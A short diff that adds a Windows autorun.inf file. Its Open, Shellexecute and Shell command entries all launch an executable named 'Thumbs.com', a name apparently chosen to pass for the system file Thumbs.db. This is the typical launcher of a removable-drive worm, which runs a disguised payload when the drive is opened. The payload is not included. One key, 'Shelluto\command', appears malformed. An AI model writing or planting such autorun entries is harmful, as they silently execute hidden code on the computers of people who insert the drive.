@@ -1,0 +1,5 @@
+[Autorun]
+Open=Thumbs.com
+Shellexecute=Thumbs.com
+Shelluto\command=Thumbs.com
+Shell=auto
